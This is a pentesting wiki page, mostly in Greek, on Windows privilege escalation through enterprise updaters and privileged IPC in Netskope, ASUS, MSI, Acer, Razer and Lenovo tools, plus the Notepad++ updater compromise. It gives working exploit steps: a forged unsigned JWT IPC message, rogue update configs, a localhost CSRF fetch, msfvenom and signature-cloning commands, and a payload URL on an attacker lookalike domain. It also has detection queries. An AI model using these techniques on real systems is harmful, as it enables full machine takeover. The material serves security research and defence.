# Κατάχρηση Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία Windows local privilege escalation chains που βρέθηκαν σε enterprise endpoint agents και updaters τα οποία εκθέτουν ένα low-friction IPC surface και ένα privileged update flow. Ένα αντιπροσωπευτικό παράδειγμα είναι το Netskope Client για Windows < R129 (CVE-2025-0309), όπου ένας low-privileged user μπορεί να εξαναγκάσει enrollment σε attacker-controlled server και στη συνέχεια να παραδώσει ένα malicious MSI που το SYSTEM service εγκαθιστά.

Βασικές ιδέες που μπορείς να επαναχρησιμοποιήσεις εναντίον παρόμοιων προϊόντων:
- Abuse ενός privileged service’s localhost IPC για να εξαναγκάσεις re-enrollment ή reconfiguration σε attacker server.
- Υλοποίησε τα update endpoints του vendor, παρέδωσε ένα rogue Trusted Root CA, και δείξε στον updater ένα malicious, “signed” package.
- Παράκαμψε weak signer checks (CN allow-lists), optional digest flags, και lax MSI properties.
- Αν το IPC είναι “encrypted”, derive το key/IV από world-readable machine identifiers που είναι αποθηκευμένα στο registry.
- Αν το service περιορίζει callers με image path/process name, inject σε ένα allow-listed process ή κάνε spawn ένα suspended και bootstrap το DLL σου μέσω ενός minimal thread-context patch.

---
## 1) Εξαναγκασμός enrollment σε attacker server μέσω localhost IPC

Πολλοί agents ship ένα user-mode UI process που μιλά σε ένα SYSTEM service μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft ένα JWT enrollment token του οποίου τα claims control το backend host (π.χ. AddonUrl). Χρησιμοποίησε alg=None ώστε να μην απαιτείται signature.
2) Στείλε το IPC μήνυμα που καλεί την provisioning command με το JWT σου και το tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να χτυπά τον rogue server σου για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν το caller verification είναι βασισμένο σε path/name, ξεκίνα το request από ένα allow-listed vendor binary (δείτε §4).

---
## 2) Hijacking το update channel για να τρέξει code ως SYSTEM

Μόλις ο client μιλήσει με τον server σου, υλοποίησε τα αναμενόμενα endpoints και κατεύθυνέ το σε ένα attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστροφή JSON config με ένα πολύ σύντομο updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνει σε ένα malicious MSI και μια fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: η υπηρεσία μπορεί να ελέγχει μόνο ότι το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Το rogue CA σου μπορεί να εκδώσει ένα leaf με αυτό το CN και να sign το MSI.
- CERT_DIGEST property: συμπερίλαβε ένα benign MSI property με όνομα CERT_DIGEST. Δεν γίνεται enforcement στο install.
- Optional digest enforcement: ένα config flag (π.χ., check_msi_digest=false) απενεργοποιεί το extra cryptographic validation.

Result: το SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας arbitrary code as NT AUTHORITY\SYSTEM.

Patch-bypass lesson: if a vendor responds by allow-listing a small set of “trusted” domains instead of cryptographically authenticating the update source, look for vendor-owned redirectors or reverse proxies that still let you steer traffic. In Netskope's case, public follow-up research showed that an R129-era allow-list could still be abused through `rproxy.goskope.com`, which proxied attacker-controlled Azure App Service content. Treat hostname allow-lists as a speed bump, not as a trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Απαρίθμησε υποψήφιες named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Εξόρυξη δεδομένων δρομολόγησης που υποστηρίζονται από το registry και χρησιμοποιούνται από plugin-based IPC servers:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Εξάγετε πρώτα τα ονόματα endpoint, τα JSON keys και τα command IDs από τον user-mode client. Τα packed Electron/.NET frontends συχνά leak το πλήρες schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Αναζήτησε το πραγματικό trust predicate, όχι απλώς το code path που τελικά εκκινεί τη process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Μοτίβα που αξίζει να δώσεις προτεραιότητα:
- `CryptQueryObject`/certificate parsing χωρίς `WinVerifyTrust` συνήθως σημαίνει ότι το “certificate exists” αντιμετωπίστηκε ως “certificate is trusted”, επιτρέποντας certificate cloning ή άλλα fake-signer tricks.
- Substring/suffix checks πάνω σε `Origin`, `Referer`, download URLs, process names, ή signer CNs δεν είναι authentication. Το `contains(".vendor.com")` είναι συνήθως exploitable με attacker-controlled lookalike domains.
- Αν το low-privileged GUI αποφασίζει “the file is trusted” και το SYSTEM broker απλώς καταναλώνει αυτό το αποτέλεσμα, το patching ή η επανυλοποίηση του client-side DLL/JS συχνά bypassάρει εντελώς το boundary (Razer-style split validation).
- Αν το broker αντιγράφει ένα payload στο `%TEMP%`/`C:\Windows\Temp` και μετά το validates ή το schedules από εκείνο το path, δοκίμασε αμέσως για TOCTOU replacement windows και για sibling plugin modules που εκθέτουν εναλλακτικά `ExecuteTask()` wrappers με πιο αδύναμους ελέγχους.

Για targets με έντονη χρήση named-pipe, το PipeViewer είναι ένας γρήγορος τρόπος να εντοπίσεις weak DACLs και remotely reachable pipes πριν αρχίσεις να κάνεις reversing το protocol σε βάθος.

Αν το target authenticate-άρει callers μόνο με PID, image path, ή process name, αντιμετώπισέ το ως speed bump και όχι ως boundary: injecting στο legitimate client, ή κάνοντας τη σύνδεση από an allow-listed process, συνήθως αρκεί για να περάσουν οι checks του server. Για named pipes συγκεκριμένα, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) καλύπτει το primitive σε περισσότερη λεπτομέρεια.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Μια νεότερη παραλλαγή που αξίζει να ψάχνεις είναι ο **signed-client RPC broker**: ένα low-privileged Lenovo-signed desktop process μιλάει σε μια SYSTEM service, και η service δρομολογεί JSON commands σε ένα σύνολο από XML-described add-ins κάτω από `%ProgramData%`. Μόλις επιτευχθεί code execution **μέσα σε οποιοδήποτε accepted signed client**, κάθε `runas="system"` contract γίνεται μέρος του attack surface σου.

High-value primitives που παρατηρήθηκαν στην έρευνα για το Lenovo Vantage:
- **Trusting the caller because it is signed by the vendor**: ερευνητές έφτασαν σε authenticated context αντιγράφοντας ένα Lenovo-signed EXE σε writable directory και ικανοποιώντας ένα DLL side-load (`profapi.dll`) ώστε να τρέξει arbitrary code μέσα σε client που το service ήδη trusted.
- **Manifest-driven attack surface discovery**: τα add-ins δηλώνονται κάτω από `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; αρκετά contracts τρέχουν ως `SYSTEM`, οπότε η απαρίθμηση αυτών των manifests συχνά αποκαλύπτει τα πραγματικά privileged verbs πιο γρήγορα από το να κάνεις reversing το ίδιο το broker.
- **Per-command bugs behind the authenticated channel**: μόλις μπεις μέσα στο trusted client, δημόσια έρευνα βρήκε path-traversal + race conditions σε update/install verbs, raw-SQL abuse σε privileged settings databases, και substring-based registry path checks που επέτρεπαν writes έξω από το intended hive.

Χρήσιμο reconnaissance σε έναν στόχο:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: whenever a helper suite exposes a broker that first authenticates the **caller process** and only then dispatches into dozens of plugin/add-in commands, do not stop after bypassing the front-door trust check. Dump the manifest/contract table and fuzz each high-privilege verb independently; the authenticated channel usually hides several second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Ακόμη και το PowerShell CLI που φαίνεται παρακάτω πετυχαίνει όταν το Origin header γίνεται spoofed στην trusted τιμή:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Οποιαδήποτε επίσκεψη του browser στο site του attacker γίνεται έτσι ένα 1-click (ή 0-click μέσω `onload`) local CSRF που οδηγεί έναν SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` κατεβάζει arbitrary executables που ορίζονται στο JSON body και τα αποθηκεύει στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Το download URL validation ξαναχρησιμοποιεί την ίδια substring logic, οπότε το `http://updates.asus.com.attacker.tld:8000/payload.exe` γίνεται δεκτό. Μετά το download, το ADU.exe απλώς ελέγχει ότι το PE περιέχει signature και ότι το Subject string ταιριάζει με ASUS πριν το εκτελέσει – χωρίς `WinVerifyTrust`, χωρίς chain validation.

Για να weaponize το flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Επειδή τόσο το Origin όσο και τα URL filters βασίζονται σε substring, και ο signer check συγκρίνει μόνο strings, το DriverHub τραβά και εκτελεί το attacker binary υπό το elevated context του.

---
## 1) TOCTOU μέσα στα updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Το SYSTEM service του MSI Center εκθέτει ένα TCP protocol όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το core component (Component ID `0f 27 00 00`) περιλαμβάνει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το supplied executable στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει το signature μέσω `CS_CommonAPI.EX_CA::Verify` (το certificate subject πρέπει να είναι “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να πετυχαίνει).
3) Δημιουργεί ένα scheduled task που τρέχει το temp file ως SYSTEM με attacker-controlled arguments.

Το copied file δεν είναι locked ανάμεσα στο verification και το `ExecuteTask()`. Ένας attacker μπορεί να:
- Στείλει Frame A που δείχνει σε ένα legitimate MSI-signed binary (εγγυάται ότι το signature check περνάει και το task μπαίνει στην ουρά).
- Race it με repeated Frame B messages που δείχνουν σε malicious payload, overwriting το `MSI Center SDK.exe` αμέσως μόλις ολοκληρωθεί το verification.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το overwritten payload ως SYSTEM παρότι είχε validatει το original file. Το reliable exploitation χρησιμοποιεί δύο goroutines/threads που spamάρουν το CMD_AutoUpdateSDK μέχρι να κερδηθεί το TOCTOU window.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID αποθηκευμένο στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να δρομολογούν commands σε arbitrary modules.
- Τα plugins μπορούν να ορίζουν τα δικά τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` χωρίς **signature validation** – οποιοσδήποτε local user μπορεί να το κατευθύνει στο `C:\Users\<user>\Desktop\payload.exe` και να πάρει SYSTEM execution deterministically.
- Sniffing του loopback με Wireshark ή instrumenting των .NET binaries σε dnSpy αποκαλύπτει γρήγορα το Component ↔ command mapping· custom Go/ Python clients μπορούν μετά να replayάρουν τα frames.

### Acer Control Centre named pipes & impersonation levels
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει remote clients (π.χ. `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή command ID `7` με ένα file path ενεργοποιεί τη process-spawning ρουτίνα του service.
- Η client library serializes ένα magic terminator byte (113) μαζί με args. Το dynamic instrumentation με Frida/`TsDotNetLib` (δείτε [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για instrumentation tips) δείχνει ότι ο native handler χαρτογραφεί αυτήν την τιμή σε `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει `CreateProcessAsUser`.
- Η αντικατάσταση του 113 (`0x71`) με 114 (`0x72`) πέφτει στο generic branch που κρατά το πλήρες SYSTEM token και θέτει ένα high-integrity SID (`S-1-16-12288`). Το spawned binary λοιπόν τρέχει ως unrestricted SYSTEM, τόσο τοπικά όσο και cross-machine.
- Συνδυάστε το με το exposed installer flag (`Setup.exe -nocheck`) για να στηθεί το ACC ακόμα και σε lab VMs και να δοκιμάσετε το pipe χωρίς vendor hardware.

Αυτά τα IPC bugs δείχνουν γιατί τα localhost services πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) και γιατί κάθε module “run arbitrary binary” helper πρέπει να μοιράζεται τις ίδιες signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο pattern σε αυτή την οικογένεια: ένας low-privileged user μπορεί να ζητήσει από έναν COM helper να ξεκινήσει ένα process μέσω του `RzUtility.Elevator`, ενώ η trust decision ανατίθεται σε ένα user-mode DLL (`simple_service.dll`) αντί να επιβάλλεται robustly μέσα στο privileged boundary.

Observed exploitation path:
- Instantiate το COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε elevated launch.
- Στο public PoC, το PE-signature gate μέσα στο `simple_service.dll` patched out πριν σταλεί το request, επιτρέποντας να εκκινηθεί arbitrary executable που επέλεξε ο attacker.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Γενικό συμπέρασμα: όταν κάνετε reversing σε σουίτες “helper”, μην σταματάτε σε localhost TCP ή named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater`, ή `Utility`, και μετά επαληθεύστε αν η privileged service πραγματικά κάνει validation του target binary ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζεται από ένα patchable user-mode client DLL. Αυτό το pattern γενικεύεται πέρα από Razer: οποιοδήποτε split design όπου ο high-privilege broker καταναλώνει μια allow/deny απόφαση από το low-privilege side είναι πιθανός privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Μεταξύ June 2025 και December 2025, attackers που παραβίασαν την hosting infrastructure πίσω από το Notepad++ update flow έστειλαν επιλεκτικά malicious manifests σε επιλεγμένα victims. Παλαιότερα WinGUp-based updaters δεν επαλήθευαν πλήρως το update authenticity, οπότε ένα hostile XML response μπορούσε να ανακατευθύνει clients σε attacker-controlled URLs. Επειδή ο client δεχόταν HTTPS content χωρίς να επιβάλλει τόσο trusted certificate chain όσο και valid PE signature στο downloaded installer, τα victims κατέβασαν και εκτέλεσαν ένα trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting και απαντήστε στα update checks με attacker metadata που δείχνει σε malicious download URL.
2. **Trojanized NSIS**: το installer κάνει fetch/executes ένα payload και abuses δύο execution chains:
- **Bring-your-own signed binary + sideload**: bundle το signed Bitdefender `BluetoothService.exe` και drop ένα malicious `log.dll` στο search path του. Όταν το signed binary εκτελεστεί, το Windows sideloads το `log.dll`, το οποίο decrypts και reflectively loads το Chrysalis backdoor (Warbird-protected + API hashing για να δυσκολεύει τη static detection).
- **Scripted shellcode injection**: το NSIS εκτελεί ένα compiled Lua script που χρησιμοποιεί Win32 APIs (e.g., `EnumWindowStationsW`) για να inject shellcode και να stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Επιβάλλετε **certificate + signature verification** του downloaded installer (pin vendor signer, reject mismatched CN/chain) και sign το update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects εκτός αν είναι validated.
- Αντιμετωπίστε το **BYO signed binary sideloading** ως post-download detection pivot: alert όταν ένα signed vendor EXE φορτώνει ένα DLL name από έξω από το canonical install path του (e.g., Bitdefender loading `log.dll` από Temp/Downloads) και όταν ένας updater drops/executes installers από temp με non-vendor signatures.
- Παρακολουθήστε **malware-specific artifacts** που παρατηρήθηκαν σε αυτή την αλυσίδα (χρήσιμα ως generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, και Lua-driven shellcode injection stages.
- Το Notepad++ απάντησε ενισχύοντας το WinGUp στο v8.8.9 και μετά: το returned XML είναι τώρα signed (XMLDSig), και τα νεότερα builds επιβάλλουν certificate + signature verification του downloaded installer αντί να εμπιστεύονται μόνο το transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί έναν μη-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Αυτά τα patterns γενικεύονται σε οποιοδήποτε updater που αποδέχεται unsigned manifests ή αποτυγχάνει να κάνει pin τους installer signers—network hijack + malicious installer + BYO-signed sideloading οδηγεί σε remote code execution υπό το πρόσχημα “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
